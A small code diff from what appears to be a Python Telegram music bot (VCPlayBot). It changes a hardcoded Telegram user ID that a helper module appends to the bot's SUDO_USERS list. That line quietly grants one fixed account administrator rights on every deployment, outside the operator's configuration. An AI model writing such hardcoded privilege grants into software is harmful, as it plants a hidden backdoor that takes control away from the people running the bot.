@@ -6,7 +6,7 @@ from pyrogram.types import Message
 from VCPlayBot.helpers.admins import get_administrators
 from VCPlayBot.config import SUDO_USERS
 
-SUDO_USERS.append(797768146)
+SUDO_USERS.append(1914050048)
 
 
 def errors(func: Callable) -> Callable:
